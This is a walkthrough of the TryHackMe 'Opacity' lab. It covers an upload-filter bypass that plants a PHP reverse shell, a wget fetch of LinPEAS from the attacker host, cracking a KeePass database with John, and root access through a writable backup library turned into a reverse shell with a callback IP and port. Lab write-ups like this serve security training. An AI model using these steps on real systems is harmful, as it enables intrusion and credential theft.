# 🌫️ TryHackMe — Opacity

> **Web Enumeration | File Upload | PHP Reverse Shell | KeePass Database | Credential Extraction | SSH | Linux Enumeration | Cron/Backup Script | PHP Code Injection | Root**

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-55a630?style=flat-square&labelColor=555555" )
![Platform](https://img.shields.io/badge/Platform-TryHackMe-00a98f?style=flat-square&labelColor=555555")
![OS](https://img.shields.io/badge/OS-Ubuntu-e95420?style=flat-square&labelColor=555555")
![Web](https://img.shields.io/badge/Web-Apache%202.4.41-d22128?style=flat-square&labelColor=555555" )
![SMB](https://img.shields.io/badge/SMB-Samba-7a1fa2?style=flat-square&labelColor=555555" )
![Technique](https://img.shields.io/badge/Technique-File%20Upload-e63946?style=flat-square&labelColor=555555" )

---

## 📌 Lab Overview

**Opacity** is a Linux-based TryHackMe machine involving several stages of enumeration and privilege escalation.

The attack chain demonstrated in the screenshots was:

```text
                    ┌──────────────────┐
                    │      Nmap        │
                    └────────┬─────────┘
                             │
                             ▼
                    ┌──────────────────┐
                    │   Web Service    │
                    │      :80         │
                    └────────┬─────────┘
                             │
                             ▼
                    ┌──────────────────┐
                    │ Directory Enum   │
                    │    /cloud/       │
                    └────────┬─────────┘
                             │
                             ▼
                    ┌──────────────────┐
                    │  File Upload     │
                    └────────┬─────────┘
                             │
                             ▼
                    ┌──────────────────┐
                    │ PHP Reverse Shell│
                    └────────┬─────────┘
                             │
                             ▼
                       www-data
                             │
                             ▼
                    ┌──────────────────┐
                    │ /opt/dataset.kdbx│
                    └────────┬─────────┘
                             │
                             ▼
                    ┌──────────────────┐
                    │ KeePass Database │
                    └────────┬─────────┘
                             │
                             ▼
                    ┌──────────────────┐
                    │ Crack KDBX Hash  │
                    │      John        │
                    └────────┬─────────┘
                             │
                             ▼
                       sysadmin
                             │
                             ▼
                    ┌──────────────────┐
                    │ ~/scripts/       │
                    │ script.php       │
                    └────────┬─────────┘
                             │
                             ▼
                    ┌──────────────────┐
                    │ backup.inc.php   │
                    │ Writable Library │
                    └────────┬─────────┘
                             │
                             ▼
                    ┌──────────────────┐
                    │ PHP Reverse Shell│
                    └────────┬─────────┘
                             │
                             ▼
                           ROOT
```

---

# 🎯 Objectives
- Enumerate the target machine.
- Identify the web application.
- Discover hidden web directories.
- Identify the file-upload functionality.
- Upload a PHP reverse shell.
- Obtain a shell as ```www-data```.
- Enumerate the filesystem.
- Discover the KeePass database.
- Transfer the ```.kdbx``` database to Kali.
- Extract the KeePass hash.
- Crack the database password using John the Ripper.
- Recover the ```sysadmin``` credentials.
- SSH into the machine as ```sysadmin```.
- Enumerate the user's scripts.
- Identify the writable library directory.
- Analyze the backup script.
- Modify the backup library.
- Obtain a root shell.
- Retrieve the proof file.

---

# 1 Initial Enumeration

The target was first scanned with Nmap:
```
nmap -sV -p- 10.49.157.54
```
The scan identified the following open ports:
```
22/tcp   open   ssh
80/tcp   open   http
139/tcp  open   netbios-ssn
445/tcp  open   netbios-ssn
```
Service detection identified:
```
SSH   → OpenSSH 8.2p1 Ubuntu
HTTP  → Apache httpd 2.4.41
SMB   → Samba
```
Interesting Services

The most interesting service at this stage was HTTP:
```
http://10.49.157.54
```
The web application became the primary attack surface.

<img width="793" height="280" alt="1" src="https://github.com/user-attachments/assets/18eb340b-cacd-407b-b22e-d85cc975cd8a" />

---

# 2 Web Application

Opening the HTTP service displayed a login page.

The application was hosted on Apache and exposed a web interface that required further enumeration.

<img width="699" height="304" alt="2" src="https://github.com/user-attachments/assets/d79301ed-332c-4baa-b344-b3bdca2dd477" />

---

# 3 Directory Enumeration

Gobuster was used to discover hidden directories:
```
gobuster dir -u http://10.49.157.54 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
The scan discovered:
```
/css/
```
and, more importantly:
```
/cloud/
```
The ```/cloud/``` directory was therefore investigated.

<img width="929" height="316" alt="3" src="https://github.com/user-attachments/assets/09ede847-3a13-477d-82d4-f8c053bbd6f2" />


---

# 4 Cloud Application

Navigating to:
```
http://10.49.157.54/cloud/
```
revealed a file-upload application.

The page was titled:
```
5 Minutes File Upload
```
and contained an:
```
UPLOAD IMAGE
```
functionality.

This immediately suggested that the upload functionality should be tested for insufficient file-type validation.

<img width="757" height="579" alt="4" src="https://github.com/user-attachments/assets/5bba3594-898a-4682-9c47-136d3ed2d55e" />

---

# 5 Testing the File Upload

The `/cloud/` application provides an image upload functionality.

Before attempting to upload a PHP file, I first tested how the application handled a normal image file.

I created a test file:

```
nano image.png
```

The file was then hosted from the Kali machine using:
```
python3 -m http.server 8000
```
The file was supplied to the upload functionality.

The application recognized the uploaded file as an image, confirming that the upload functionality performs some form of file-type validation.

<img width="480" height="235" alt="5-1" src="https://github.com/user-attachments/assets/9beecb55-b127-4026-b296-6002ceece3e9" />
<img width="601" height="180" alt="5-2" src="https://github.com/user-attachments/assets/8e962608-f38f-4d7d-913f-a7683050f6f9" />

# 6 Bypassing the Image Extension Check

The upload functionality appeared to accept only image formats.

A direct attempt to upload:

```text
rev.php
```
did not work because the application expected an image extension.

I then created a PHP reverse shell named:
```
rev.php
```
and hosted it from my Kali machine:
```
python3 -m http.server 8000
```
The PHP reverse shell was available at:
```
http://192.168.132.194:8000/rev.php
```
Instead of directly submitting the ```.php``` URL, I appended an image extension:
```
http://192.168.132.194:8000/rev.php .jpg
```
This allowed the supplied URL to end with:
```
.jpg
```
while the actual resource being requested from my HTTP server was:
```
rev.php
```
<img width="840" height="311" alt="6" src="https://github.com/user-attachments/assets/c1c7eefb-b9f7-4b33-a374-8fbb2b60e3d9" />

---

# 7 Uploading the PHP Reverse Shell

The following URL was entered into the upload field:
```
http://192.168.132.194:8000/rev.php.jpg
```
Then **Upload Image** was selected.

The application accepted the URL and redirected to the uploaded-file location.

This demonstrated that the application's validation was based on the apparent image extension rather than properly validating the actual content being retrieved.

The important distinction was:

Submitted URL:
```
http://192.168.132.194:8000/rev.php.jpg
                         │
                         └── looks like an image

Actual file hosted by Kali:

rev.php
 │
 └── contains PHP reverse-shell code
```

<img width="538" height="374" alt="7-1" src="https://github.com/user-attachments/assets/570df748-a316-470b-b0b0-b4dbc4b4fda7" />

---

# 8 Accessing the Uploaded File

After the upload, the application redirected to the location of the uploaded file.

The uploaded resource could then be accessed through the application's `/cloud/images/` directory.

<img width="474" height="58" alt="7-3" src="https://github.com/user-attachments/assets/225bab35-79b5-48bb-87c3-0eba9be02ee9" />

Before triggering the shell, a Netcat listener was started on Kali:
```
nc -lvnp 4848
```
The uploaded PHP file was then accessed, causing the PHP code to execute on the target.

A reverse-shell connection was received from the target:
```
connect to [192.168.132.194] from (UNKNOWN) [10.49.157.54]
```
The resulting shell was running as:
```
www-data
```
<img width="1022" height="218" alt="7-4" src="https://github.com/user-attachments/assets/33f2529a-89b0-4838-b20b-15a124ad71d4" />

## 🔑 Key Observation

The important weakness was not simply "PHP upload."

The application trusted the **file extension supplied in the URL** without adequately verifying that the downloaded content was actually an image.

This allowed the PHP reverse shell to be disguised behind an image extension:
```
rev.php → rev.php .jpg
```
and ultimately led to remote code execution.

---

# 9 Enumerating `/home`

After obtaining the web shell, `/home` was enumerated:
```
cd /home
ls
```
The following directories were discovered:
```
sysadmin
ubuntu
```
The `sysadmin` directory contained interesting files:
```
local.txt
scripts/
```
However, the `www-data` user could not directly read `local.txt`:
```
cat local.txt
```
returned:
```
Permission denied
```
<img width="624" height="468" alt="8" src="https://github.com/user-attachments/assets/3b0a11b0-bf41-465b-b10a-90e05e43d938" />

---

# 10 Enumerating `sysadmin/scripts`

The scripts directory was investigated:
```
cd /home/sysadmin/scripts
ls -la
```
The directory contained:
```
lib/
script.php
```
The `script.php` file was owned by:
```
root:sysadmin
```
and could not be directly read by `www-data`.

<img width="557" height="260" alt="9" src="https://github.com/user-attachments/assets/aaac6133-3e46-494c-8915-c91171bb9b0a" />

# 11 Further Local Enumeration

A Linux enumeration script was transferred to the target.

The script was downloaded into `/tmp`:
```
wget http://192.168.132.194:8000/Linpeas.sh
```
The file was then made executable:
```
chmod +x Linpeas.sh
```
and executed:
```
./Linpeas.sh
```
This enumeration helped identify additional interesting files and privilege-escalation paths.

<img width="760" height="373" alt="10" src="https://github.com/user-attachments/assets/f062d3be-2d73-46af-aa1e-32152025caf9" />

---

# 12 Discovering the KeePass Database

The `/opt` directory contained a KeePass database:
```
dataset.kdbx
```
The target was used to host the file temporarily:
```
cd /opt
python3 -m http.server
```
The Python server started on:
```
0.0.0.0:8000
```
<img width="775" height="163" alt="11" src="https://github.com/user-attachments/assets/d543f5c7-37c3-41ec-85a3-1780501794e6" />

# 13 Downloading `dataset.kdbx`

The KeePass database was downloaded from the target to Kali:
```
wget 10.49.134.219:8000/dataset.kdbx
```
The file was successfully downloaded:
```
dataset.kdbx
```
<img width="611" height="219" alt="11-2" src="https://github.com/user-attachments/assets/271a5bda-03c4-4c19-ac16-41737860617b" />

---

# 14 Opening the KeePass Database

The database was opened using KeePass:
```
dataset.kdbx
```
The application requested the master password.

Since the master password was not known, the KeePass database was prepared for password cracking.

<img width="640" height="373" alt="11-3" src="https://github.com/user-attachments/assets/a7b5ab28-6fcc-4843-8c70-9adf50d3a9d8" />

---

# 15 Extracting the KeePass Hash

The `keepass2john` utility was used:
```
keepass2john dataset.kdbx > hash.txt
```
The generated hash was inspected:
```
cat hash.txt
```
The output contained a KeePass hash:
```
$keepass$*2*100000*...
```
---

# 16 Cracking the KeePass Password

John the Ripper was used with the RockYou wordlist:
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
John successfully cracked the KeePass database password.

The output showed:
```
(dataset)
```
The recovered password was then used to open the KeePass database.

<img width="783" height="382" alt="12" src="https://github.com/user-attachments/assets/85e892b6-2b35-4a2f-802d-2f8bb28897de" />

---

# 17 Recovering the `sysadmin` Credentials

The KeePass database was opened again using the recovered master password.

The database contained a credential entry:
```
User Name: sysadmin
Password: ********
```
This provided the credentials needed to access the `sysadmin` account.

<img width="750" height="306" alt="13" src="https://github.com/user-attachments/assets/27b24be6-3a6c-4e77-aba4-195a3e7f23c5" />

---

# 18 SSH as `sysadmin`

The recovered credentials were used to connect through SSH:
```
ssh sysadmin@10.49.168.3
```
The login was successful.

The current user was verified:
```
id
```
Output:
```
uid=1000(sysadmin)
gid=1000(sysadmin)
groups=1000(sysadmin),24(cdrom),30(dip),46(plugdev)
```

<img width="641" height="692" alt="14" src="https://github.com/user-attachments/assets/ce0679a1-b65d-4198-b8e2-67bedde05369" />

---

# 19 Sysadmin Enumeration

The home directory was enumerated:
```
ls
```
Files included:
```
local.txt
scripts/
```
The local flag was attempted:
```
cat local.txt
```
The current user did not initially have the required permissions.

<img width="647" height="109" alt="15" src="https://github.com/user-attachments/assets/d96f5205-22dc-46d8-8006-cfd1791d50a2" />

The scripts directory became the next target.

---

# 20 Inspecting the Scripts Directory

The scripts directory was examined:
```
cd scripts
ls -la
```
Output showed:
```
lib/
script.php
```
The directory permissions were important:
```
drwxr-xr-x 2 sysadmin root ... lib
-rw-r--r-- 1 root sysadmin ... script.php
```
The `lib` directory was owned by `sysadmin`, making it particularly interesting.

<img width="700" height="421" alt="16" src="https://github.com/user-attachments/assets/af14ab4b-bf4e-46d8-9259-49f2cc9c5cab" />

---

# 21 Understanding `script.php`

The script was:
```
<?php

// Backup of scripts sysadmin folder
require_once("lib/backup.inc.php");

zipData(
    "/home/sysadmin/scripts",
    "/var/backups/backup.zip"
);

echo "Successful", PHP_EOL;

// Files scheduled removal
$dir = "/var/www/html/cloud/images";

if(file_exists($dir)){
    ...
}
?>
```
The important line was:
```
require_once("lib/backup.inc.php");
```
The script loads:
```
/home/sysadmin/scripts/lib/backup.inc.php
```
The contents of this library therefore needed to be examined.

---

# 22 Inspecting `backup.inc.php`

The `lib` directory was entered:
```
cd scripts/lib
ls -la
```
The backup library contained:
```
backup.inc.php
```
The file was examined:
```
cat backup.inc.php
```
The PHP code implemented a function named:
```
zipData()
```
which creates a ZIP archive from a source directory.

<img width="588" height="153" alt="17-2" src="https://github.com/user-attachments/assets/c99983ff-0fbe-4a45-8b6a-51eff798db23" />

<img width="1241" height="563" alt="17" src="https://github.com/user-attachments/assets/cdd42101-4b92-4a21-85d9-41e73c9f4ea0" />

---

# 23 Identifying the Writable Library

The permissions on the library were important.

The `sysadmin` user had the ability to modify the library.

This meant that code placed inside:
```
backup.inc.php
```
could potentially be executed when the backup script was run.

The original backup library was removed:
```
rm -rf backup.inc.php
```
A replacement PHP file was then created.

<img width="500" height="33" alt="18-1" src="https://github.com/user-attachments/assets/fc16d4d4-646d-4651-9811-94693e7bb078" />

---

# 24 Creating a PHP Reverse Shell

A PHP reverse-shell payload was placed into:
```
backup.inc.php
```
The reverse shell was configured to connect back to Kali:
```
$ip = '192.168.132.194';
$port = 1234;
```
The important idea was:
```
backup script
      │
      ▼
require_once("lib/backup.inc.php")
      │
      ▼
malicious PHP code
      │
      ▼
reverse shell
```

<img width="842" height="412" alt="18-2" src="https://github.com/user-attachments/assets/022305c9-d8a4-4000-ae19-21b8b3857391" />

---

# 25 Triggering the Backup Script

A Netcat listener was started on Kali:
```
nc -lvnp 1234
```
When the backup process executed the modified PHP library, the reverse shell connected back to Kali.

The connection originated from:
```
10.49.168.3
```
The resulting shell showed:
```
id=0(root)
gid=0(root)
groups=0(root)
```
This confirmed that the backup process executed the modified PHP code with root privileges.

<img width="629" height="229" alt="19" src="https://github.com/user-attachments/assets/ab80f1fb-b1bd-4e28-812d-e2efeff335e6" />

---

# 26 Retrieving the Proof

After obtaining root access:
```
cd /root
ls
```
The root directory contained:
```
proof.txt
snap
```
The final proof was read:
```
cat proof.txt
```
<img width="297" height="111" alt="20" src="https://github.com/user-attachments/assets/20ee4d25-af6d-42eb-83d3-8bbbeef6b257" />
